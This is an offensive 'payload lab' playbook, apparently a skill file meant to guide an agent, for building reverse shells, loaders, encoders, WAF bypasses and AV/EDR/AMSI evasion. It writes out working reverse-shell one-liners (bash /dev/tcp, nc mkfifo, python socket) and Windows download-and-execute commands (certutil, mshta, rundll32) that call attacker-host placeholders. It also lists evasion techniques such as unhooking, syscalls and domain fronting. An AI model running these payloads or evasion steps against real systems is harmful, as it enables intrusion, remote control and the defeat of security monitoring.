---
description: "Build and verify payloads: reverse shells, loaders, encoders, AMSI and AV/EDR evasion, WAF bypass, OAST callbacks, and a local validation loop that proves a payload works before it touches the target."
whenToUse: "A working payload is needed: shell, loader, encoded request, WAF bypass, or detection-evasion test."
---

# Payload lab playbook

A payload is finished when it ran in a controlled replica and produced the expected callback. Everything before that is a draft.

## 1. Pick the delivery channel

| Channel | Constraints that decide the payload |
| --- | --- |
| HTTP request body/param | Length limits, WAF parser, charset, JSON/XML escaping |
| File upload | Interpreter mapping, extension handling, content sniffing |
| Document/macro | Office version, macro policy, Protected View |
| Binary execution | Architecture, OS version, signed-binary policy, EDR |
| Network protocol | Protocol framing, TLS, authentication |

## 2. Build the smallest thing that proves execution

```bash
# Linux
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# Windows
powershell -nop -w hidden -enc BASE64_UTF16LE
certutil -urlcache -f http://LHOST/PAYLOAD.exe %TEMP%\p.exe && %TEMP%\p.exe
mshta http://LHOST/p.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://LHOST/p.sct")
```

Prove with a benign action first (`id`, `whoami`, a DNS callback). Then swap in the real objective. A shell that never returns a prompt is not a shell.

## 3. Encoding and obfuscation

- Match the decoder to the sink: URL-encode for request lines, HTML-entity for markup, Unicode escapes for JSON, Base64 for PowerShell `-enc`.
- Layer only as much as the parser requires; each layer adds failure modes you must test in the same order the target decodes.
- Keep a decoder note next to the payload: `request → url-decode → json-parse → base64 → command`.
- Obfuscation for AV/EDR testing must preserve semantics: string concatenation, case changes, alternative APIs, sleep/indirect calls, and signed-binary proxies are testable hypotheses, never guarantees.

## 4. WAF bypass workflow

1. Send the blocked payload, record the exact block response and status.
2. Test the parser, not the words: change case, add comments (`/**/`, `--`, `#`), split keywords, use equivalent syntax (`UNION SELECT` vs `UNION%0aSELECT`, `alert` vs `top['alert']`), change content type, change encoding.
3. Try parameter pollution, JSON duplicate keys, multipart boundaries, chunked transfer, and oversized headers.
4. Re-test the bypass payload against the real sink to prove the backend still executes it; a bypass that reaches the WAF but not the application is noise.

## 5. Evasion engineering (lab-verified only)

| Layer | Testable technique |
| --- | --- |
| AMSI | Patch or bypass in the current process, then prove a script that was blocked now runs |
| PowerShell logging | Constrained language, downgrade attacks, alternative hosts |
| EDR userland hooks | Unhooking, direct/indirect syscalls, module stomping (verify on the exact agent build) |
| Network detection | Domain fronting, redirectors, beacon jitter, TLS fingerprint shaping |
| Memory scanning | Encryption-in-sleep, callback-based execution, signed-module proxies |

Every technique needs: the exact build it was verified on, the detection it defeated, and the residual signal it still leaves. Claim only what you re-tested.

## 6. Local validation loop

- Replica container or VM matching the target OS/build.
- Network monitor on the callback path (listener log with timestamps).
- For documents: open in the target Office version with the same macro policy.
- For binaries: run under the same architecture and capture both the payload's effect and any AV/EDR alert.

Record in the case file: payload hash, delivery channel, replica build, observed effect, detection outcome.

## 7. OAST verification

Use a unique subdomain per attempt (`<attempt-id>.OAST_DOMAIN`) so a delayed callback maps to one payload. Log the DNS and HTTP hits with timestamps. A DNS-only hit proves resolution, not code execution — say which one you got.

## Pitfalls

- Encoded payloads that exceed the target's field length truncate silently.
- A firewall may allow the callback protocol but block the port.
- AV/EDR test results are build-specific; a bypass on one build is a hypothesis on another.
- Reverse shells on Windows through PowerShell often die with the parent process; prefer a detached channel for long work.
